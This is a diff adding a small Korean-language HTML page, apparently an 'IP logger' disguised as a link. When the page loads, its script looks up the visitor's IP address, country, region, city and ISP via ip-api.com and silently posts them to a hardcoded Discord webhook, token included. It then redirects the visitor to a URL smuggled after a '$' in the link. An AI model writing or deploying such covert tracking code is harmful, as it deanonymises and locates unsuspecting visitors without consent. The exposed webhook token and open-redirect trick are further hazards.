@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebConnect</title>
+    <meta>
+</head>
+<body>
+    <h1 id="tis">Hello</h1>
+    <script language="javascript">
+        function getCookie(name) {
+            let matches = document.cookie.match(new RegExp(
+                "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+            ));
+            return matches ? decodeURIComponent(matches[1]) : undefined;
+        }
+        function sendMessage(t1,t2,t3,t4,t5) {
+            const request = new XMLHttpRequest();
+            var web = "1003618098273853450/eMAyn3Em63cBVtEgKUMYVlEFRyQcnqVAniUI2mCOHVKXZKkL_LpBD7zDK5tABL_5A0Yq"
+            request.open("POST", "https://discordapp.com/api/webhooks/"+web);
+
+            request.setRequestHeader('Content-type', 'application/json');
+            
+            const params = {
+                username: "WebLogger",
+                avatar_url: "",
+                content: "",
+                embeds: [{
+                    fields: [
+                        {
+                            "name": "국가",
+                            "value": t1,
+                            "inline": true
+                        },
+                        {
+                            "name": "지역",
+                            "value": t2,
+                            "inline": true
+                        },
+                        {
+                            "name": "도시",
+                            "value": t3
+                        },
+                        {
+                            "name": "인터넷 서비스 제공자",
+                            "value": t4
+                        },
+                        {
+                            "name": "아이피(IP)",
+                            "value": t5,
+                            "inline": true
+                        }
+                    ]
+                }]
+            }
+
+            request.send(JSON.stringify(params));
+        }
+        var requestURL = "http://ip-api.com/json"
+        var request = new XMLHttpRequest();
+        request.open('GET', requestURL);
+        request.responseType = 'json';
+        request.send();
+        request.onload = function() {
+            var myObj = this.response
+            if (myObj.status == "success") {
+                document.getElementById("tis").innerHTML = "국가:" + myObj.country + "/지역:" + myObj.regionName + "/도시:" + myObj.city + "/인터넷 서비스 제공자:" + myObj.isp
+                sendMessage(myObj.country,myObj.regionName,myObj.city,myObj.isp,myObj.query)
+            } else {
+                document.getElementById("tis").innerHTML = "L"
+            }
+        }
+    </script>
+    <script>
+		var link = document.URL;
+		var linkis = link.split("$")
+		document.location=linkis[1];
+	</script>
+</body>
+</html>
